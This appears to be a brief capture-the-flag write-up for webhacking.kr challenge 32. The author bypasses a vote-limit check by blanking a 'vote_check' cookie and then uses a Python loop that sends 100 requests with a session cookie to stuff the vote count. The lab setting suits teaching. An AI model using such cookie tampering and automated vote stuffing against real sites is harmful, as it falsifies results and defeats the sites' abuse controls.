# 32

I pressed anything randomly and the alert alert showed up that I have voted already. I realized that there are many users and I was curious if it's a real data.
I used `ctrl+f` to see if my id is included, and there it was.

Since the information about myself is somewhere included that I have already voted, I checked cookies and boom there was a variable called `vote_check`. I changed to 'no' and ''(empty string) and checked if It worked and I found that it worked when it was ''(empty string).

To solve this, I used request module that request 100 times    
                             

```python
import requests

# obtained by looking into session cookie
cookies = {'PHPSESSID' : 'lfv0adj1d95jhrpvvgqa6cs5bh',
           'vote_check':''};
i = 100
while(i != 0 ):
    res = requests.get("https://webhacking.kr/challenge/code-5/?hit=rightzero",cookies = cookies)
    i = i - 1;
```

and Boom~!
